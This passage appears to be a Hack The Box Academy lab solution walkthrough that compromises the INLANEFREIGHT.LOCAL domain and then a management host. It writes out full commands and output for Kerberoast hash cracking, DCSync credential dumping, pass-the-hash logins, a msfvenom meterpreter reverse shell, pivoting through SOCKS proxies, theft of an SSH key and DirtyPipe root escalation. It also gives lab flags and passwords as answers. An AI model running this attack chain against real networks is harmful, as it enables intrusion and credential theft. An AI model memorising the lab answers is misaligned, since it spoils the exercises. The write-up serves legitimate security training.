30b1b2712627383d5de35debd1893b336c76acb7af818b1e8e991c6dfad8cde1f119333f7360cc46aace7b2c2f44d7ce6758897aa0dda2d60241885c0b372debf7a7dec7760307c7b2a38b581e297bff629648d92c55383b4a4a8111a10b6010ef0016e3c4d6fcc42ed7c904770158bd06a5ca167dc8c6713c83b91e74e5e6c11ae58b1b10a3cd9fc1371e3b6c459a263dbcb9154cab4b98eba6616b7ad228580c842ed89a8927d37b06d29cd2d39c69fe523
```

With the hash attained, students now need to copy it over to `Pwnbox`/`PMVPN` and crack it with `Hashcat`, utilizing hashmode 13100; students will find out that the plaintext of the cracked password hash is `Repeat09`:

Code: shell

```shell
hashcat -m 13100 -O -w 3 hash /usr/share/wordlists/rockyou.txt.gz
```

```shell-session
┌─[us-academy-1]─[10.10.15.8]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ hashcat -m 13100 -O -w 3 hash /usr/share/wordlists/rockyou.txt.gz

hashcat (v6.1.1) starting...

<SNIP>

Host memory required for this attack: 134 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt.gz
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$krb5tgs$23$*ttimmons$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/ttimmons*$a8e24991afcbcb96dd7e42cf2cb17721$c14a933e6bb4242468e13116ee6371a9a53149379ad526d796c1b57b41a592873f36013e7ee3d9ebac5d714d867872b10fbe97c073f778223e92b4d25a561de7ef80cd2e3a0fee56b8e3351b4787236d8add28b206aff5b2944ef8225d8b14c14066c2ddae040ec348cedcc36c000b83268effa71cce194ad97b642e7dd4b994d3730633c947b6af80de503b712d69c190acf884166a4d941549d3fde5048a8c7b3b3c8ac621ae97f1070ecbc5faae4df78e9bcf8e2c48dfe8133c547a0b8aaf257f1cd5fc59761589ec1a5ccb164c917d78daef3207464504578eedbcf7f95711be2551875dd27d9792bc989c534af601c1dddeb5797d82987bb6c4085faa5fe7145486239a5db4f56b53b9e97d1c3d1742a8df3656aa8b8addc21346eb38062f17ef605d72bb2ffa6e72dd3963be11c9478c6132f2e7d873fb24e1df61bf15eade81b1e1cc00610496050d3aa446d12758f5cd3daf6cf9c72dd39856560b1f822b7213e7ef6297b910ca2d1e6f7e38a5416a11047ba64dd52bf041e869f9999c0eb700c488197c8baba97470b2d946bf56419415762151117e4d186006a3ee65c3507640e6b56533dd610e432e4ad3a1ad9ab430189eb85314213dd98d55bcc556b3e056ef7056e66d64b5d969af86fe6e915eb3cb9f5c0bfba5290e4c198fb5bff07a09037f096f09b315e4834f9575aeff3dbfbb59a73a5814b14dcf854f81f09653c0588c38b41c0dc2a9424140e53afb799e5c97deccdb618e305a365d5a7b4e80f118c858ebabb513cec6d459a57a7492529047beb78b21bca8cea1e179f52ce97b8c192988058e57e6b1fa79e886bb743523fcd4423f3585c34da485c0c14b08dcdf4e0465102b09a8c7ef3dc43fb7d81a479478bfd1e79d6c2e979ec71c0a1d35479120d42caa55a5419f6aefa46d339bd2b9cecc6740558c5b4ec3f06424b4511962a1de488d065f130c6cfb9941cbe895d6613a18a36be3c6d925504e0f59cfe057326b2c441445753c2f5defe3d6e2982a227f67548392399ce548248a92e720ec12f285e815030eeff42cb97ee2db39e7c667a105010c214c9af8a3fac4eb895da7ba70a8fcf0b0d3a237a30b1b2712627383d5de35debd1893b336c76acb7af818b1e8e991c6dfad8cde1f119333f7360cc46aace7b2c2f44d7ce6758897aa0dda2d60241885c0b372debf7a7dec7760307c7b2a38b581e297bff629648d92c55383b4a4a8111a10b6010ef0016e3c4d6fcc42ed7c904770158bd06a5ca167dc8c6713c83b91e74e5e6c11ae58b1b10a3cd9fc1371e3b6c459a263dbcb9154cab4b98eba6616b7ad228580c842ed89a8927d37b06d29cd2d39c69fe523:Repeat09

<SNIP>
```

Answer: `Repeat09`

# Active Directory Compromise

## Question 2

### "After obtaining Domain Admin rights, authenticate to the domain controller and submit the contents of the flag.txt file on the Administrator Desktop."

Now that students have obtained the password for the `ttimons` user from the previous question (i.e., `Repeat09`), they need to place him in the `Server Admins` group, thus allowing for a DCSync attack and dumping all hashes of the domain. Using the same RDP connection on the Windows target `ACADEMY-AEN-DEV01` that has `PowerView` from the previous questions, students need to create another `PSCredential` object and add `ttimmons` to the `Server Admins` group to inherit `DCSync Privileges`:

Code: powershell

```powershell
$timpass = ConvertTo-SecureString 'Repeat09' -AsPlainText -Force
$timcreds = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\ttimmons', $timpass)
$group = Convert-NameToSid "Server Admins"
Add-DomainGroupMember -Identity $group -Members 'ttimmons' -Credential $timcreds -verbose
```

```powershell-session
PS C:\Share> $timpass = ConvertTo-SecureString 'Repeat09' -AsPlainText -Force
PS C:\Share> $timcreds = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\ttimmons', $timpass)
PS C:\Share> $group = Convert-NameToSid "Server Admins"
PS C:\Share> Add-DomainGroupMember -Identity $group -Members 'ttimmons' -Credential $timcreds -verbose

VERBOSE: [Get-PrincipalContext] Using alternate credentials
VERBOSE: [Add-DomainGroupMember] Adding member 'ttimmons' to group 'S-1-5-21-2814148634-3729814499-1637837074-1622'
```

From `Pwnbox`/`PMVPN`, students need to run `secretsdump.py` through `proxychains` to dump NTDS and capture the hash of the Administrator user (supplying the password `Repeat09` when prompted to):

Code: shell

```shell
sudo proxychains secretsdump.py ttimmons@172.16.8.3 -just-dc-ntlm
```

```shell-session
┌─[us-academy-1]─[10.10.15.8]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ sudo proxychains secretsdump.py ttimmons@172.16.8.3 -just-dc-ntlm

ProxyChains-3.1 (http://proxychains.sf.net)
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Password:
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.8.3:445-<><>-OK
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.8.3:135-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.8.3:49666-<><>-OK
Administrator:500:aad3b435b51404eeaad3b435b51404ee:fd1f7e5564060258ea787ddbb6e6afa2:::
<SNIP>
```

Students can connect to the DC using `EvilWinRM` and `proxychains`, utilizing the hash `fd1f7e5564060258ea787ddbb6e6afa2`:

Code: shell

```shell
proxychains evil-winrm -i 172.16.8.3 -u Administrator -H fd1f7e5564060258ea787ddbb6e6afa2
```

```shell-session
┌─[us-academy-1]─[10.10.15.8]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ proxychains evil-winrm -i 172.16.8.3 -u Administrator -H fd1f7e5564060258ea787ddbb6e6afa2
ProxyChains-3.1 (http://proxychains.sf.net)

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

|S-chain|-<>-127.0.0.1:9050-<><>-172.16.8.3:5985-<><>-OK
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

At last, students need to print out the flag file "flag.txt" under the directory `C:\Users\Administrator\Desktop\`, to find its contents to be `7c09eb1fff981654a3bb3b4a4e0d176a`:

Code: powershell

```powershell
type C:\Users\Administrator\Desktop\flag.txt
```

```powershell-session
*Evil-WinRM* PS C:\Users\Administrator\Documents> type C:\Users\Administrator\Desktop\flag.txt

|S-chain|-<>-127.0.0.1:9050-<><>-172.16.8.3:5985-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.8.3:5985-<><>-OK

7c09eb1fff981654a3bb3b4a4e0d176a
```

Answer: `7c09eb1fff981654a3bb3b4a4e0d176a`

# Active Directory Compromise

## Question 3

### "Compromise the INLANEFREIGHT.LOCAL domain and dump the NTDS database. Submit the NT hash of the Administrator account as your answer."

To obtain the Administrator hash, students can refer to the output from the previously ran `secretsdump.py` command or run it again. The Administrator hash is `fd1f7e5564060258ea787ddbb6e6afa2`:

Code: shell

```shell
sudo proxychains secretsdump.py ttimmons@172.16.8.3 -just-dc-ntlm
```

```shell-session
┌─[us-academy-1]─[10.10.15.8]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ sudo proxychains secretsdump.py ttimmons@172.16.8.3 -just-dc-ntlm

ProxyChains-3.1 (http://proxychains.sf.net)
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Password:
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.8.3:445-<><>-OK
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.8.3:135-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.8.3:49666-<><>-OK
Administrator:500:aad3b435b51404eeaad3b435b51404ee:fd1f7e5564060258ea787ddbb6e6afa2:::
<SNIP>
```

Answer: `fd1f7e5564060258ea787ddbb6e6afa2`

# Post-Exploitation

## Question 1

### "Gain access to the MGMT01 host and submit the contents of the flag.txt file in a user's home directory."

Utilizing the previously attained private key, students need to establish two SSH sessions into `DMZ01`, i.e., 172.16.8.3. One session with local port forwarding for `Win-RM`, and one session with reverse port forwarding to allow the double hop:

Code: shell

```shell
ssh -i id_rsa -L 5985:172.16.8.3:5985 root@STMIP
```

```shell-session
┌─[us-academy-1]─[10.10.15.8]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ ssh -i id_rsa -L 5985:172.16.8.3:5985 root@10.129.203.114
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-113-generic x86_64)

<SNIP>

Last login: Thu Jun 23 05:39:18 2022
root@dmz01:~#
```

For the reverse port forwarding session:

Code: shell

```shell
ssh -i id_rsa -R 1234:PWNIP:8443 root@STMIP
```

```shell-session
┌─[us-academy-1]─[10.10.15.8]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ ssh -i id_rsa -R 1234:10.10.15.8:8443 root@10.129.203.114
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-113-generic x86_64)

<SNIP>

Last login: Thu Sep 29 03:22:56 2022 from 10.10.15.8
root@dmz01:~# 
```

Subsequently, using the previously harvested hash `fd1f7e5564060258ea787ddbb6e6afa2` of Administrator, students need to connect to `DC01` via `Evil-WinRM`:

Code: shell

```shell
evil-winrm -i 127.0.0.1 -u Administrator -H fd1f7e5564060258ea787ddbb6e6afa2
```

```shell-session
┌─[us-academy-1]─[10.10.15.8]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ evil-winrm -i 127.0.0.1 -u Administrator -H fd1f7e5564060258ea787ddbb6e6afa2

Evil-WinRM shell v3.3

<SNIP>

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

Students can now enumerate the domain controller to discover yet another subnet, `172.16.9.0/23`:

Code: powershell

```powershell
ipconfig /all
```

```powershell-session
*Evil-WinRM* PS C:\Users\Administrator\Documents> ipconfig /all

<SNIP>

Ethernet adapter Ethernet1:

   Connection-specific DNS Suffix  . :
   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter #2
   Physical Address. . . . . . . . . : 00-50-56-B9-41-F7
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   Link-local IPv6 Address . . . . . : fe80::fcb1:accc:3762:4295%7(Preferred)
   IPv4 Address. . . . . . . . . . . : 172.16.9.3(Preferred)
   Subnet Mask . . . . . . . . . . . : 255.255.254.0
   Default Gateway . . . . . . . . . : 172.16.9.1
   DHCPv6 IAID . . . . . . . . . . . : 167792726
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-2A-C6-1A-0C-00-50-56-B9-D6-24
   DNS Servers . . . . . . . . . . . : ::1
                                       172.16.9.1
   NetBIOS over Tcpip. . . . . . . . : Enabled
```

Then, students need to perform a ping sweep against the `172.16.9.0/23` subnet, finding `172.16.9.25` to respond:

Code: powershell

```powershell
1..100 | % {"172.16.9.$($_): $(Test-Connection -count 1 -comp 172.16.9.$($_) -quiet)"}
```

```powershell-session
Evil-WinRM* PS C:\Users\Administrator\Documents> 1..100 | % {"172.16.9.$($_): $(Test-Connection -count 2 -comp 172.16.9.$($_) -quiet)"}

172.16.9.1: False
172.16.9.2: False
<SNIP>
172.16.9.25: True
```

From `Pwnbox`/`PMVPN`, students need to create a Windows-based `meterpreter` payload that will call back to the internal `NIC` on `DMZ01` but be executed from the target DC (it's important that `LPORT` has the same value that was specified for the `nc` reverse port forwarding session, in here it is 1234):

Code: shell

```shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.8.120 -f exe -o dc_shell.exe LPORT=PWNPO
```

```shell-session
┌─[us-academy-1]─[10.10.15.8]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.8.120 -f exe -o dc_shell.exe LPORT=1234

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: dc_shell.exe
```

Subsequently, students need to use the `Evil-WinRM` session established with the target DC to upload the `meterpreter payload` just created (noticing that the home directory of `Pwnbox` might be different for each user, thus, it needs to be changed accordingly):

Code: powershell

```powershell
upload "/home/htb-ac413848/dc_shell.exe"
```

```powershell-session
*Evil-WinRM* PS C:\Users\Administrator\Documents> upload "/home/htb-ac413848/dc_shell.exe"

Info: Uploading /home/htb-ac413848/dc_shell.exe to C:\Users\Administrator\Documents\dc_shell.exe

Data: 9556 bytes of 9556 bytes copied

Info: Upload successful!
```

Then, students need to use `msfconsole` and start a `multi handler` for the Windows payload:

Code: shell

```shell
msfconsole -q
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 8443
run
```

```shell-session
┌─[us-academy-1]─[10.10.15.8]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ msfconsole -q

[msf](Jobs:0 Agents:0) >> use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:1) exploit(multi/handler) >> set LHOST 0.0.0.0
LHOST => 0.0.0.0
[msf](Jobs:0 Agents:1) exploit(multi/handler) >> set LPORT 8443
LPORT => 8443
[msf](Jobs:0 Agents:1) exploit(multi/handler) >> run
```

Students now need to execute the generated `msfvenom` reverse TCP payload that was copied over into `DC01` to notice that a new `meterpreter` session has started:

Code: powershell

```powershell
.\dc_shell.exe
```

```powershell-session
*Evil-WinRM* PS C:\Users\Administrator\Documents> .\dc_shell.exe
```

```shell-session
[*] Sending stage (200774 bytes) to 10.10.15.8
[*] Meterpreter session 1 opened (10.10.15.8:8443 -> 10.10.15.8:39814) at 2022-09-29 05:16:23 +0100

(Meterpreter 1)(C:\Users\Administrator\Documents) > 
```

On the `meterpreter` session, students need to use `autoroute` to add a route to the `172.16.9.0/23` network so that `Pwnbox`/`PMVPN` can reach hosts on that network through `MSF`:

Code: shell

```shell
run autoroute -s 172.16.9.0/23
```

```shell-session
(Meterpreter 1)(C:\Users\Administrator\Documents) > run autoroute -s 172.16.9.0/23

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
[*] Adding a route to 172.16.9.0/255.255.254.0...
[+] Added route to 172.16.9.0/255.255.254.0 via 10.10.15.8
[*] Use the -p option to list all active routes
```

Thereafter, students need to background the current `meterpreter` session and configure the `SOCKS` proxy server:

Code: shell

```shell
bg
use auxiliary/server/socks_proxy
set SRVPORT 9050
set VERSION 4a
run
```

```shell-session
(Meterpreter 1)(C:\Users\Administrator\Documents) > bg

[*] Backgrounding session 1...
[msf](Jobs:0 Agents:1) exploit(multi/handler) >> use auxiliary/server/socks_proxy
[msf](Jobs:0 Agents:1) auxiliary(server/socks_proxy) >> set SRVPORT 9050
SRVPORT => 9050
[msf](Jobs:0 Agents:1) auxiliary(server/socks_proxy) >> set VERSION 4a
VERSION => 4a
[msf](Jobs:0 Agents:1) auxiliary(server/socks_proxy) >> run
[*] Auxiliary module running as background job 0.

[msf](Jobs:1 Agents:1) auxiliary(server/socks_proxy) >> [*] Starting the SOCKS proxy server
```

Afterward, students need to test the `SOCKS` proxy server and pivoting setup by running an `Nmap` scan from `Pwnbox`/`PMVPN` to `172.16.9.25`:

Code: shell

```shell
proxychains nmap -sT -p 22 172.16.9.25
```

```shell-session
┌─[us-academy-1]─[10.10.15.8]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ proxychains nmap -sT -p22 172.16.9.25

ProxyChains-3.1 (http://proxychains.sf.net)
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-29 05:58 BST
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.9.25:80-<--denied
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.9.25:22-<><>-OK
Nmap scan report for 172.16.9.25
Host is up (1.0s latency).

PORT   STATE SERVICE
22/tcp open  ssh

Nmap done: 1 IP address (1 host up) scanned in 1.38 seconds
```

Now that the host is reachable, students need to enumerate `DC01`, which they connected to using `Evil-WinRM`, to discover that the SSH private key of the user `ssmallsadm` can be found under the directory `C:\Department Shares\IT\Private\Networking\`, thus, they need to download it:

Code: shell

```shell
download "C:\Department Shares\IT\Private\Networking\ssmallsadm-id_rsa" ./ssmallsadmKey
```

```shell-session
*Evil-WinRM* PS C:\Users\Administrator\Documents> download "C:\Department Shares\IT\Private\Networking\ssmallsadm-id_rsa" ./ssmallsadmKey

Info: Downloading C:\Department Shares\IT\Private\Networking\ssmallsadm-id_rsa to ./ssmallsadmKey
Info: Download successful!
```

From `Pwnbox`/`PMVPN`, students need to use the attained SSH private key (after assigning it the appropriate permissions) to connect to `172.16.9.25`, proxying the connection through `proxychains`:

Code: shell

```shell
chmod 600 ssmallsadmKey
proxychains ssh -i ssmallsadmKey ssmallsadm@172.16.9.25
```

```shell-session
┌─[us-academy-1]─[10.10.15.8]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ chmod 600 ssmallsadmKey
┌─[us-academy-1]─[10.10.15.8]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ proxychains ssh -i ssmallsadmKey ssmallsadm@172.16.9.25

ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.9.25:22-<><>-OK
The authenticity of host '172.16.9.25 (172.16.9.25)' can't be established.
ECDSA key fingerprint is SHA256:3I77Le3AqCEUd+1LBAraYTRTF74wwJZJiYcnwfF5yAs.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '172.16.9.25' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.10.0-051000-generic x86_64)

<SNIP>

Last login: Mon May 23 08:48:13 2022 from 172.16.0.1
ssmallsadm@MGMT01:~$
```

At last, students need to print out the flag file "flag.txt", to find its contents to be `3c4996521690cc76446894da2bf7dd8f`:

Code: shell

```shell
cat flag.txt
```

```shell-session
ssmallsadm@MGMT01:~$ cat flag.txt

3c4996521690cc76446894da2bf7dd8f
```

Answer: `3c4996521690cc76446894da2bf7dd8f`

# Post-Exploitation

## Question 2

### "Escalate privileges to root on the MGMT01 host. Submit the contents of the flag.txt file in the /root directory."

Using the same SSH connection (proxy-ed via `proxychains`) established from the previous question for the user `ssmallsadm`, students, after running `uname`, will find out that `MGMT01` (i.e., `172.16.9.25`) is vulnerable to `DirtyPipe`:

Code: shell

```shell
uname -a
```

```shell-session
ssmallsadm@MGMT01:~$ uname -a

Linux MGMT01 5.10.0-051000-generic #202012132330 SMP Sun Dec 13 23:33:36 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
```

Thus, students need to first clone the [CVE-2022-0847-DirtyPipe-Exploits](https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits) on `Pwnbox`/`PMVPN` and copy "exploit-2.c" to the clipboard so that they can paste it in a file inside `MGMT01`:

Code: shell

```shell
git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
cd CVE-2022-0847-DirtyPipe-Exploits/
cat exploit-2.c | xclip -se c
```

```shell-session
┌─[us-academy-1]─[10.10.15.8]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git

Cloning into 'CVE-2022-0847-DirtyPipe-Exploits'...
remote: Enumerating objects: 27, done.
remote: Counting objects: 100% (27/27), done.
remote: Compressing objects: 100% (23/23), done.
remote: Total 27 (delta 7), reused 9 (delta 2), pack-reused 0
Receiving objects: 100% (27/27), 11.46 KiB | 1.04 MiB/s, done.
Resolving deltas: 100% (7/7), done.
┌─[us-academy-1]─[10.10.15.8]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ cd CVE-2022-0847-DirtyPipe-Exploits/
┌─[us-academy-1]─[10.10.15.8]─[htb-ac413848@pwnbox-base]─[~/CVE-2022-0847-DirtyPipe-Exploits]
└──╼ [★]$ cat exploit-2.c | xclip -se c
```

Then, inside of `MGMT01`, students need to paste the exploit code inside a file, compile it with `gcc`, and make it executable:

```shell
gcc exploit.c -o dirtypipe
chmod +x dirtypipe
```

```shell-session
ssmallsadm@MGMT01:~$ gcc exploit.c -o dirtypipe
ssmallsadm@MGMT01:~$ chmod +x dirtypipe
```

To use the exploit, students need to find a `SUID`executable, for which they can use the command `find`:

```shell
find / -perm -4000 2>/dev/null
```

```shell-session
ssmallsadm@MGMT01:~$ find / -perm -4000 2>/dev/null

/usr/lib/openssh/ssh-keysign

<SNIP>
```

Students now can execute the exploit and specify `/usr/lib/openssh/ssh-keysign` as the `SUID executable`, and at last, print out the flag file "flag.txt" under the root directory, to find its contents to be `206c03861986c0e264438cb6e8e90a19`:

```shell
./dirtypipe /usr/lib/openssh/ssh-keysign
cat /root/flag.txt
```

```shell-session
ssmallsadm@MGMT01:~$ ./dirtypipe /usr/lib/openssh/ssh-keysign 

[+] hijacking suid binary..
[+] dropping suid shell..
[+] restoring suid binary..
[+] popping root shell.. (dont forget to clean up /tmp/sh ;))
# cat /root/flag.txt

206c03861986c0e264438cb6e8e90a19
```

Answer: `206c03861986c0e264438cb6e8e90a19`